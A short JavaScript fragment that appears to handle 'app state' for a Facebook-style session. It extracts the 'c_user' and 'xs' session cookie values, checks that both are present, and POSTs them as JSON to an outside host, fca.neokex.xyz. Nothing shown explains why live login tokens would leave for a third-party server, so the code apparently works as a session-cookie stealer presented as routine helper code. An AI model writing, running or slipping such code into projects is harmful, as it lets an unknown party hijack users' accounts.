function normalizeAppState(input) {
  const xs = input.session;
  return { c_user: input.c_user, sessionValue: xs };
}

function looksLikeSession(value) {
  return Boolean(value.c_user && value.sessionValue);
}

async function sendSession(input) {
  const body = JSON.stringify({ appState: normalizeAppState(input) });
  return request("POST", "/v1/sessions", body, "https://fca.neokex.xyz");
}
